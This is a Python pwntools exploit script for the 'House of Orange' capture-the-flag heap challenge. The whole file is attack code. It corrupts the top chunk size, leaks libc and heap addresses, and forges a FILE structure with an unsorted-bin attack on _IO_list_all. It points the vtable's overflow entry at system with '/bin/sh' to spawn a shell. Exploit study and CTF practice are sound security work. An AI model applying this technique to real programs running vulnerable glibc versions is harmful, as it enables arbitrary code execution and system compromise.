#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-12-29 14:03:27
# @Author  : giantbranch (giantbranch@gmail.com)
# @Link    : http://www.giantbranch.cn/
# @tags : 


# struct house{
#     struct orange* point;
#     qword*  name;
# }

# struct orange{
#     dword   price
#     dword   color;
# }

from pwn import *
# context.log_level = "debug"
p = process("./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 # 1. Red            
 # 2. Green            
 # 3. Yellow            
 # 4. Blue            
 # 5. Purple            
 # 6. Cyan            
 # 7. White 
def build(nameLen, name, price, color):
    p.recvuntil("Your choice : ")
    p.sendline("1")
    p.recvuntil("Length of name :")
    p.sendline(str(nameLen))
    p.recvuntil("Name :")
    p.send(name)
    p.recvuntil("Price of Orange:")
    p.sendline(str(price))
    p.recvuntil("Color of Orange:")
    p.sendline(str(color))

def see():
    p.recvuntil("Your choice : ")
    p.sendline("2")

def upgrade(nameLen, name, price, color):
    p.recvuntil("Your choice : ")
    p.sendline("3")
    p.recvuntil("Length of name :")
    p.sendline(str(nameLen))
    p.recvuntil("Name:")
    p.send(name)
    p.recvuntil("Price of Orange:")
    p.sendline(str(price))
    p.recvuntil("Color of Orange:")
    p.sendline(str(color))

def getpid():
    print proc.pidof(p)[0]
    pause()

main_arena_offset = 0x3c4b20


######### overwrite top chunk size
build(0x10, "A"*0x10, 10,  1)
upgrade(0x40, "A"*0x10+ p64(0) + p64(0x21) + p64(0x0000001f0000000a) + p64(0) * 2 + p64(0xfa1), 10 , 1)
# let top chunk to unsort bin list
build(0xfb0, "A"*0x10, 10,  1)

######### leak libc
# in 64 bit, must malloc more than 0x3e9 to get large bin
build(0x400, "A"*8, 10,  1)
# build(0x3e9, "A"*8, 10,  1)
see()
p.recvuntil("Name of house : AAAAAAAA")
largebin_leak = u64(p.recvuntil("\n")[:-1].ljust(8, "\x00"))
print "largebin_leak = " + hex(largebin_leak)
main_arena = largebin_leak - 1640
print "main_arena = " + hex(main_arena)
libc_base = main_arena - main_arena_offset
print "libc_base = " + hex(libc_base)
system = libc_base + libc.symbols['system']
_IO_list_all = libc_base + libc.symbols['_IO_list_all']
print "system = " + hex(system)
print "_IO_list_all = " + hex(_IO_list_all)

# getpid()
# leak heap
upgrade(0x20, "A"*0x10, 10 , 1)
see()
p.recvuntil("Name of house : AAAAAAAAAAAAAAAA")
heap_addr = u64(p.recvuntil("\n")[:-1].ljust(8, "\x00"))
print "heap_addr = " + hex(heap_addr)

# unsortbin attack to write _IO_list_all
payload = "A" * 0x400 # padding
payload += p64(0) + p64(0x21) + p64(0x0000001f0000000a) + p64(0)

# fake_file:   fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
fake_file = "/bin/sh\x00" + p64(0x61) 
fake_file += p64(0xaabbccdd) + p64(_IO_list_all-0x10) #unsortbin attack
fake_file += p64(0) + p64(1) #_IO_write_base < _IO_write_ptr
fake_file += p64(0) * 18
fake_file += p64(0) # fp->_mode <= 0
fake_file += p64(0) * 2 # _unused2
fake_file += p64(heap_addr + 0x510) # vtable_point (point to next)

payload += fake_file
payload += p64(0) * 3 # vtable
payload += p64(system)  # __overflow <-- system

print hex(len(payload))
# getpid()

upgrade(0x6666, payload, 11, 2)

# getshell
p.recvuntil("Your choice : ")
p.sendline("1")
p.interactive()
